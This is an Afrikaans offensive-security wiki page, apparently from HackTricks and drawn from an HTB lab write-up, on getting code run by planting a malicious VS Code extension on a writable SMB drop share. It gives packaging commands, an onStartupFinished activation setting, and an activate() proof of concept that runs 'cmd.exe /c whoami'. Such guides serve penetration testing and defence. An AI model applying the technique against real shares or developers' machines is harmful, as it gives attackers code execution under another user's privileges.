# VS Code-uitbreiding: uitvoering vanaf 'n drop share

{{#include ../banners/hacktricks-training.md}}

VS Code-uitbreidings en Visual Studio VSSDK-uitbreidings gebruik albei `.vsix`-verpakking, maar hulle het verskillende manifeste en runtimes. 'n Skryfbare SMB drop share word slegs 'n uitvoeringspad **as** 'n ander gebruiker of ontplooiingstaak sy pakkette in VS Code installeer. Die uitbreiding se `activate()`-funksie loop dan in die extension host met daardie gebruiker se voorregte. Deur bloot 'n `.vsix` na 'n share te skryf, word dit nie uitgevoer nie.<sup>[[1]](#references)[[2]](#references)</sup>

## Pakket- en aktiveringswerkvloei

Bevestig eers die VS Code-weergawe wat die pakket gaan gebruik, en dat die share werklik gesinchroniseer of geïnstalleer word. Genereer 'n TypeScript-uitbreiding en plaas die beoogde Node.js-aksie in `activate()`. Gebruik 'n aktiveringsgebeurtenis wat loop sonder dat 'n gebruiker 'n opdrag kies, soos `onStartupFinished`, en stel die uitbreiding dan saam en verpak dit. `engines.vscode` is die **runtime-versoenbaarheidshek**; om `@types/vscode` by die teiken-API-weergawe te laat pas, is 'n bou-tyd-versoenbaarheidsmaatreël, nie 'n installasietydvereiste nie.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

Vir 'n redigeerder wat VS Code 1.118 gebruik, is die relevante `package.json`-velde:<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

’n Minimale `activate()`-kontrole kan ’n opdrag uitvoer en die uitvoer vanaf die extension host aanteken. Vervang die toetsaksie eers nadat jy bevestig het dat die package in die verwagte account/session geaktiveer is. Die `onStartupFinished`-gebeurtenis loop ná opstart, dus is dit nie bewys van uitvoering voordat die editor werklik begin en die extension geïnstalleer en geaktiveer is nie.<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

'n Aanvaller met skryftoegang tot die drop share kan die getoetste pakket oplaai en vir die verbruikende taak wag. In die Checkpoint-voorbeeld het die herstelde rekening se toegang tot die share die skryftoegang verskaf; die rekening met lae voorregte waarmee daar begin is, kon net die share lees. Hou hierdie twee voorvereistes apart. Gebruik vir **Visual Studio**-uitbreidings die afsonderlike hoofstuk [Visual Studio VSIX-uitbreidingsmisbruik](visual-studio-vsix-extension-abuse.md), nie hierdie VS Code-werkvloei nie.<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - Aktiveringsgebeurtenisse](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - Uitbreidings publiseer](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
